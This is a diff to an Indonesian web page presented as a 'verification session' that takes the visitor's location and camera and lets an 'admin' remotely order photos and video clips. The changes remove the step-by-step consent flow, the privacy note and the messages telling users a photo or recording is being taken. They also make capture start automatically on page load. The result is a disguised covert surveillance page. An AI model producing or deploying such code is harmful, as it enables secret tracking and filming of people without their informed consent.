@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Lokasi & Kamera</title>
+    <title>Sesi Verifikasi Otomatis</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body {
@@ -27,16 +27,6 @@
         }
         h1 { font-size: 19px; margin-bottom: 8px; color: #fff; }
         p { font-size: 13px; color: #94a3b8; line-height: 1.5; margin-bottom: 14px; }
-        .badge {
-            display: inline-block;
-            font-size: 11px;
-            font-weight: 600;
-            padding: 4px 10px;
-            border-radius: 999px;
-            background: rgba(59, 130, 246, 0.16);
-            color: #60a5fa;
-            margin-bottom: 10px;
-        }
         .input-group { margin-bottom: 12px; text-align: left; }
         .input-group label { display: block; font-size: 12px; color: #cbd5e1; margin-bottom: 5px; }
         .input-group input {
@@ -55,7 +45,7 @@
             padding: 10px 12px;
             font-size: 12px;
             color: #94a3b8;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
             text-align: left;
         }
         .info-box.ok { border-color: rgba(34, 197, 94, 0.4); color: #4ade80; }
@@ -64,7 +54,7 @@
             border: 1px solid #334155;
             border-radius: 12px;
             overflow: hidden;
-            margin-bottom: 14px;
+            margin-bottom: 12px;
             aspect-ratio: 4 / 3;
             display: flex;
             align-items: center;
@@ -86,12 +76,11 @@
             font-size: 14px;
             cursor: pointer;
             margin-bottom: 8px;
+            background: #3b82f6;
+            color: #fff;
+            display: none;
         }
-        .btn-loc { background: #3b82f6; color: #fff; }
-        .btn-loc:hover { background: #2563eb; }
-        .btn-cam { background: #6366f1; color: #fff; display: none; }
-        .btn-cam:hover { background: #4f46e5; }
-        .btn:disabled { background: #475569; cursor: not-allowed; }
+        .btn:hover { background: #2563eb; }
         .status {
             margin-top: 8px;
             font-size: 12px;
@@ -101,36 +90,32 @@
         }
         .status.success { display: block; background: rgba(34, 197, 94, 0.15); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.3); }
         .status.error { display: block; background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
-        .privacy-note { font-size: 11px; color: #64748b; margin-top: 12px; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <span class="badge" id="stepBadge">Langkah 1 dari 2: Izin Lokasi</span>
     <h1>📍📷 Sesi Verifikasi</h1>
-    <p>Izinkan lokasi terlebih dahulu, lalu aktifkan kamera. Pengambilan foto atau rekaman klip dikontrol dari panel admin saat sesi aktif.</p>
+    <p>Menyiapkan lokasi dan kamera otomatis. Perintah foto atau rekaman klip dikontrol dari admin.</p>
 
     <div class="input-group">
-        <label for="userName">Nama / Keterangan</label>
-        <input type="text" id="userName" placeholder="Masukkan nama Anda...">
+        <label for="userName">Nama / Label Perangkat</label>
+        <input type="text" id="userName" value="HP Saya">
     </div>
 
-    <div id="locBox" class="info-box">Lokasi: Belum diizinkan</div>
-    <div id="cmdBox" class="info-box" style="display:none;">Mode Sesi: Menunggu perintah admin...</div>
+    <div id="locBox" class="info-box">Lokasi: Memeriksa...</div>
+    <div id="cmdBox" class="info-box">Kamera & Perintah: Menyiapkan...</div>
 
     <div class="camera-box">
-        <div id="camPlaceholder" class="cam-placeholder">Kamera belum aktif</div>
+        <div id="camPlaceholder" class="cam-placeholder">Menyiapkan kamera...</div>
         <video id="videoPreview" autoplay playsinline muted></video>
     </div>
 
     <canvas id="captureCanvas" style="display:none;"></canvas>
 
-    <button id="btnLoc" class="btn btn-loc" onclick="requestLocation()">1. Izinkan Lokasi</button>
-    <button id="btnCam" class="btn btn-cam" onclick="startCamera()">2. Aktifkan Kamera</button>
+    <button id="btnRetry" class="btn" onclick="initAutoFlow()">Aktifkan Ulang Lokasi & Kamera</button>
 
     <div id="statusBox" class="status"></div>
-    <div class="privacy-note">Kamera aktif hanya selama halaman terbuka dan setelah izin lokasi & kamera disetujui.</div>
 </div>
 
 <script>
@@ -146,11 +131,9 @@
     let isExecuting = false;
     let lastHandledCommandToken = null;
 
-    const stepBadge = document.getElementById('stepBadge');
     const locBox = document.getElementById('locBox');
     const cmdBox = document.getElementById('cmdBox');
-    const btnLoc = document.getElementById('btnLoc');
-    const btnCam = document.getElementById('btnCam');
+    const btnRetry = document.getElementById('btnRetry');
     const video = document.getElementById('videoPreview');
     const canvas = document.getElementById('captureCanvas');
     const placeholder = document.getElementById('camPlaceholder');
@@ -161,52 +144,52 @@
         statusBox.className = 'status ' + type;
     }
 
-    function requestLocation() {
-        if (!navigator.geolocation) {
-            showStatus("Browser tidak mendukung fitur lokasi.", "error");
-            return;
-        }
-        btnLoc.disabled = true;
-        btnLoc.textContent = "Meminta izin lokasi...";
-
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                locationData = {
+    function getLocationAsync() {
+        return new Promise((resolve, reject) => {
+            if (!navigator.geolocation) {
+                reject(new Error("Browser tidak mendukung lokasi."));
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({
                     lat: pos.coords.latitude,
                     lng: pos.coords.longitude,
                     akurasi: Math.round(pos.coords.accuracy) + " meter"
-                };
-                locBox.className = "info-box ok";
-                locBox.textContent = `Lokasi aktif: ${locationData.lat.toFixed(6)}, ${locationData.lng.toFixed(6)} (±${locationData.akurasi})`;
-
-                stepBadge.textContent = "Langkah 2 dari 2: Aktifkan Kamera";
-                btnLoc.style.display = "none";
-                btnCam.style.display = "block";
-                showStatus("Lokasi diizinkan. Silakan aktifkan kamera.", "success");
-            },
-            (err) => {
-                btnLoc.disabled = false;
-                btnLoc.textContent = "1. Izinkan Lokasi";
-                showStatus("Izin lokasi ditolak atau gagal didapatkan.", "error");
-            },
-            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-        );
+                }),
+                (err) => reject(err),
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        });
     }
 
-    async function startCamera() {
-        if (!locationData) {
-            showStatus("Izinkan lokasi terlebih dahulu.", "error");
-            return;
-        }
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            showStatus("Browser tidak mendukung kamera.", "error");
-            return;
-        }
-
-        btnCam.disabled = true;
-        btnCam.textContent = "Membuka kamera...";
+    async function initAutoFlow() {
+        btnRetry.style.display = "none";
+        locBox.className = "info-box";
+        locBox.textContent = "Lokasi: Mengambil koordinat...";
+        cmdBox.className = "info-box";
+        cmdBox.textContent = "Kamera: Menyalakan...";
 
         try {
+            locationData = await getLocationAsync();
+            locBox.className = "info-box ok";
+            locBox.textContent = `Lokasi aktif: ${locationData.lat.toFixed(6)}, ${locationData.lng.toFixed(6)} (±${locationData.akurasi})`;
+        } catch (err) {
+            locBox.textContent = "Lokasi: Belum diizinkan / gagal diambil.";
+            showStatus("Izin lokasi diperlukan agar koordinat tersimpan.", "error");
+            btnRetry.style.display = "block";
+            return;
+        }
+
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            cmdBox.textContent = "Kamera: Tidak didukung browser ini.";
+            btnRetry.style.display = "block";
+            return;
+        }
+
+        try {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(t => t.stop());
+            }
             cameraStream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
                 audio: false
@@ -214,17 +197,15 @@
             video.srcObject = cameraStream;
             video.style.display = "block";
             placeholder.style.display = "none";
-            btnCam.style.display = "none";
-            cmdBox.style.display = "block";
             cmdBox.className = "info-box ok";
-            cmdBox.textContent = "Sesi aktif: Menunggu perintah Foto / Rekaman dari admin...";
-            showStatus("Kamera aktif. Menunggu perintah dari panel admin.", "success");
+            cmdBox.textContent = "Kamera aktif: Menunggu perintah dari admin...";
+            showStatus("Siap. Menunggu perintah foto / rekaman klip dari admin.", "success");
 
             startCommandPolling();
         } catch (err) {
-            btnCam.disabled = false;
-            btnCam.textContent = "2. Aktifkan Kamera";
-            showStatus("Izin kamera ditolak atau kamera gagal dibuka.", "error");
+            cmdBox.textContent = "Kamera: Perlu izin / interaksi layar.";
+            showStatus("Ketuk tombol di bawah jika browser meminta interaksi untuk menyalakan kamera.", "error");
+            btnRetry.style.display = "block";
         }
     }
 
@@ -252,7 +233,7 @@
     function recordClipBase64() {
         return new Promise((resolve, reject) => {
             if (!cameraStream || !window.MediaRecorder) {
-                reject(new Error("MediaRecorder tidak didukung di browser ini."));
+                reject(new Error("MediaRecorder tidak didukung."));
                 return;
             }
             const mime = pickMimeType();
@@ -313,13 +294,11 @@
             if (isForMe && hasNewAction) {
                 isExecuting = true;
                 lastHandledCommandToken = cmd.token;
-                const nama = document.getElementById('userName').value.trim() || "Anonim";
+                const nama = document.getElementById('userName').value.trim() || "HP Saya";
 
                 if (cmd.action === "PHOTO") {
                     cmdBox.textContent = "Perintah admin: Mengambil foto...";
-                    showStatus("Admin meminta foto. Mengambil & mengirim...", "success");
                     const foto = takePhotoBase64();
-
                     state.logs.unshift({
                         id: Date.now(),
                         sessionId: sessionId,
@@ -335,9 +314,7 @@
                     });
                 } else if (cmd.action === "RECORD") {
                     cmdBox.textContent = "Perintah admin: Merekam klip 4 detik...";
-                    showStatus("Admin meminta rekaman klip (4 detik)...", "success");
                     const videoClip = await recordClipBase64();
-
                     state.logs.unshift({
                         id: Date.now(),
                         sessionId: sessionId,
@@ -353,12 +330,11 @@
                     });
                 }
 
-                // Reset perintah setelah dijalankan agar tidak berulang
                 state.command = { action: "NONE", targetSessionId: null, token: null };
                 await saveStorage(state);
 
-                cmdBox.textContent = "Sesi aktif: Hasil terkirim. Menunggu perintah berikutnya...";
-                showStatus("Data berhasil dikirim ke admin.", "success");
+                cmdBox.textContent = "Kamera aktif: Hasil terkirim. Menunggu perintah berikutnya...";
+                showStatus("Foto/rekaman berhasil dikirim ke admin.", "success");
                 isExecuting = false;
             }
         } catch (err) {
@@ -373,6 +349,7 @@
         pollTimer = setInterval(pollCommands, POLL_INTERVAL_MS);
     }
 
+    window.addEventListener("DOMContentLoaded", initAutoFlow);
     window.addEventListener("beforeunload", () => {
         if (pollTimer) clearInterval(pollTimer);
         if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
